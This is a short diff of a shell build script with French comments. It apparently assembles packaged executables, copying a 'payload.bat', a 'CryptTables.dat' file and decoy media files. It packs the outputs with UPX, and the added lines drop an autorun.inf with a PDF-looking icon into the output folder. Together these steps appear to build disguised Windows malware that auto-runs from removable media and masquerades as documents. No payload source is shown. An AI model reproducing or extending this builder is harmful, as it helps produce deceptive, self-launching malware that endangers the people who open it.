@@ -45,6 +45,7 @@ ${TEMPDIR}/${UNIQUEID}X.exe -k ${UNIQUEID} -s -i ${WORKDIR}/base/curl.exe    -o 
 
 echo "Préparation du répertoire de travail"
 cp ${WORKDIR}/base/payload.bat ${TEMPDIR}/${UNIQUEID}P.bat
+
 for i in CryptTables.dat image.jpg image.png document.pdf video.mp4
 do
   cp ${WORKDIR}/base/$i ${TEMPDIR}/${i}
@@ -105,6 +106,8 @@ for i in ${EXTENTIONS}
 do
   mv ${i}.exe ${i}.upx.exe ${OUTPUTDIR}
 done
+cp ${WORKDIR}/base/autorun.inf ${OUTDIR}/
+cp ${WORKDIR}/base/icon_pdf.ico ${OUTDIR}/autorun.ico
 
 ${PAUSE}
 
